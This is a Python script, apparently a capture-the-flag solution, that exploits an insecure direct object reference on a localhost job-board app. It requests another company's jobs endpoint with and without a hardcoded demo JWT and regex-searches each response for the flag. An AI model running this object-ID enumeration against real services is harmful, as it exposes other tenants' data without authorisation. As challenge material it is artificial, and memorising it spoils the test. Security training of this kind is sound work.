import requests
import re
import time

base_url = "http://127.0.0.1:8000"
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzY3MjQzODc4fQ.weTygG9dyY_DPi_6NUCOWWPLKnPyb_fERr7IxzbYKD0"

print("IDOR Vulnerability Test - Extract Flag from /company/2/jobs")
print("=" * 65)

# Test 1: Server connectivity
try:
    print("\n[TEST 1] Checking server connectivity...")
    resp = requests.get(base_url, timeout=10)
    print(f"✓ Server reachable - Status: {resp.status_code}")
except Exception as e:
    print(f"✗ Server connectivity error: {e}")
    print("Target may not be running on port 8000")

# Test 2: Unauthenticated access to /company/1/jobs
print("\n[TEST 2] Unauthenticated access to /company/1/jobs")
try:
    resp = requests.get(f"{base_url}/company/1/jobs", timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} bytes")
    print(f"Response: {resp.text[:300]}")
    
    flag = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag:
        print(f"[FLAG] {flag.group(0)}")
except Exception as e:
    print(f"Error: {type(e).__name__} - {e}")

# Test 3: Unauthenticated access to /company/2/jobs
print("\n[TEST 3] Unauthenticated access to /company/2/jobs (TARGET)")
try:
    resp = requests.get(f"{base_url}/company/2/jobs", timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} bytes")
    print(f"Response: {resp.text[:300]}")
    
    flag = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag:
        print(f"[FLAG] {flag.group(0)}")
except Exception as e:
    print(f"Error: {type(e).__name__} - {e}")

# Test 4: Authenticated access to /company/1/jobs
print("\n[TEST 4] Authenticated access to /company/1/jobs")
try:
    headers = {"Authorization": f"Bearer {jwt_token}"}
    resp = requests.get(f"{base_url}/company/1/jobs", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} bytes")
    print(f"Response: {resp.text[:300]}")
except Exception as e:
    print(f"Error: {type(e).__name__} - {e}")

# Test 5: Authenticated access to /company/2/jobs
print("\n[TEST 5] Authenticated access to /company/2/jobs (TARGET)")
try:
    headers = {"Authorization": f"Bearer {jwt_token}"}
    resp = requests.get(f"{base_url}/company/2/jobs", headers=headers, timeout=15)
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} bytes")
    print(f"Full Response: {resp.text}")
    
    # Search for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"\n{'='*65}")
        print(f"[SUCCESS!] FLAG FOUND: {flag_match.group(0)}")
        print(f"[SUCCESS!] IDOR exploited successfully!")
        print(f"{'='*65}")
    else:
        print("\n[!] No flag found in response")
except Exception as e:
    print(f"Error: {type(e).__name__} - {e}")
